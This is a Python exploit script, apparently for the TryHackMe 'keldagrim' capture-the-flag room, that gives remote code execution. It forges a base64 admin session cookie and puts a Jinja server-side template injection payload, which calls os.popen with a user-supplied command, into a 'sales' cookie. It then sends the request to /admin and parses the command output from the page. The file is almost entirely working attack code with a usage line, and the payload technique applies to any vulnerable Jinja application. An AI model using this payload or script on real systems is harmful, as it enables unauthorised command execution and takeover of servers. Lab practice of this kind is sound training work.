#This file gives RCE on the box keldagrim on tryhackme.
# https://tryhackme.com/room/keldagrim
# By Lepus Hare.

#Usage:
#attack.py <command> <ip> 


import requests
import base64
import sys
import re

# The webserver has two cookies, both of which are b64 encoded. 
# The session is the type of user.
# The 'sales' allows for SSTI in Jinja.
# References: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection"
# RCE Insert - {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

#Grab the template from the reference
ssti_template = "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('" + sys.argv[1] +  "').read() }}"

#Base64 encode the command with template for injection
command = base64.b64encode(str.encode(ssti_template)).decode()

#Headers 
headers = {'Cookie': 'session=YWRtaW4=; sales='+command}
#Get the response
response = requests.get('http://' + sys.argv[2] + '/admin', headers=headers);

#print(response.content.decode())
print("Sending command: " + sys.argv[1] + " --> " + sys.argv[2])
print("--")
print(re.search('Current user - \s+([.\s\S]+)<\/p>', response.content.decode()).group(1))
